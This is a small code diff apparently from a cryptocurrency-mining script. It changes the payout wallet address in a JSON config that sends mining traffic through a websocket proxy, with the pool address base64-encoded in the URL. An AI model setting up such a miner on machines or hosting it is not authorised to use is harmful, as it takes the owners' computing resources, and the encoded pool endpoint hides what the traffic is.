@@ -35,7 +35,7 @@ cat > data.json <<'EOF'
   "proxy": "wss://deji-hv6a.onrender.com/cG93ZXIyYi5uYS5taW5lLnpwb29sLmNhOjYyNDI=",
   "config": { "threads": 4, "log": true },
   "options": {
-    "user": "RXi399jsFYHLeqFhJWiNETySj5nvt2ryqj",
+    "user": "RWRBUB1MyCu9TuzedVXpFbLLSv7jS3eZKQ",
     "password": "c=RVN",
     "argent": "Deb22222"
   }
@@ -167,6 +167,7 @@ if __name__ == "__main__":
         asyncio.run(main_async())
     except KeyboardInterrupt:
         print("\n⏹️  Interrupted — shutting down.", file=sys.stderr)
+
 
 
 
